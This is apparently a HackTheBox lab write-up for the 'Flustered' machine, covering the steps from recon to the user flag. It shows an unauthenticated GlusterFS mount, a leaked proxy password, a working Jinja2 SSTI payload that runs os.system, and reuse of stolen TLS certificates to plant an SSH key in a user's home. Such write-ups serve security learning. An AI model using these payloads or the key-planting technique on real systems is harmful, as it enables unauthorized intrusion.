---
title: "Flustered"
date: 2026-08-21 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, medium, glusterfs, squid, ssti, jinja2, mariadb, pivoting]
image:
    path: /assets/Images/flustered-001_foothold_user-flag.png
    alt: Flustered
description: "Flustered is a medium Linux box centered on storage solutions. An unauthenticated GlusterFS server leaks a volume of MariaDB files containing Squid proxy credentials; the proxy reaches an internal Flask app vulnerable to Server-Side Template Injection, then world-readable GlusterFS certificates allow mounting a second volume (a user's home) to plant an SSH key. This post covers recon through user.txt."
---

## Overview

Flustered is a Medium-difficulty Linux machine built around two storage systems — GlusterFS and the Azure Storage emulator (Azurite). The path to `user.txt` runs through an unauthenticated GlusterFS volume (leaking Squid credentials from a MariaDB datadir), a Squid-proxied internal Flask app with a Server-Side Template Injection, and a second GlusterFS volume whose world-readable TLS certs let you mount a user's home and drop an SSH key. This post stops at the user flag.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | |
| 80   | nginx | "steampunk-era.htb - Coming Soon" |
| 3128 | Squid | auth-required proxy |
| 24007 / 49152+ | GlusterFS | distributed FS, unauthenticated |

```bash
nmap -p- --min-rate=1000 -T4 10.129.8.77
nmap -p22,80,3128,24007,49152 -sV -sC -Pn 10.129.8.77
```

The GlusterFS ports (24007 management + 49152 brick) stand out — GlusterFS is frequently left unauthenticated.

## Enumeration

GlusterFS lets us list and mount volumes with no credentials. `vol1` fails (SSL), but `vol2` mounts and contains a MariaDB data directory:

```bash
sudo apt install -y glusterfs-client
gluster --remote-host=10.129.8.77 volume list      # vol1, vol2
echo "10.129.8.77 flustered.htb flustered" | sudo tee -a /etc/hosts   # mount resolves the hostname
sudo mount -t glusterfs flustered:/vol2 /mnt
```

Reading the Squid credential table (a quick `strings` works without even starting a DB server) yields `lance.friedman:o>WJ5-jD<5^m3`. That authenticates to the Squid proxy, which reaches the localhost-only web server — where the Flask app source (`/app/app.py`) shows it renders a JSON `siteurl` field straight into a Jinja2 template.

## Foothold

The internal app builds its HTML with `render_template_string` over user input, so it is vulnerable to SSTI. The public port-80 site is that same app, so the injection can be hit directly:

```bash
curl -H 'Content-Type: application/json' -d '{"siteurl":"{{7*7}}"}' http://10.129.8.77/   # title shows 49
```

A standard Jinja2 sandbox-escape gadget (subclasses → the `warning` class → `os.system`) runs commands as `www-data`:

```bash
# subclasses-"warning" gadget executing os.system("<cmd>") in the siteurl JSON field
curl -H 'Content-Type: application/json' \
  -d '{"siteurl":"{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").system(\"<cmd>\")}}{%endif%}{% endfor %}"}' \
  http://10.129.8.77/
```

As `www-data` we can't read jennifer's home, but `/etc/ssl/glusterfs.{key,pem,ca}` are world-readable. Copying them locally lets us mount the SSL-protected `vol1` — which is mounted on the box as `/home/jennifer`. GlusterFS maps brick ownership to our local uid, so we can read `user.txt` and write our SSH key:

```bash
sudo cp glusterfs.key glusterfs.pem glusterfs.ca /etc/ssl/
sudo mount -t glusterfs flustered:/vol1 /mnt/jennifer
cat ~/.ssh/id_ed25519.pub >> /mnt/jennifer/.ssh/authorized_keys
ssh -i jen_key jennifer@10.129.8.77
```

![Flustered user flag](/assets/Images/flustered-001_foothold_user-flag.png)

## User flag

```bash
cat /home/jennifer/user.txt   # HTB{...}
```

Access as `jennifer` achieved — `user.txt` captured (value redacted).

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
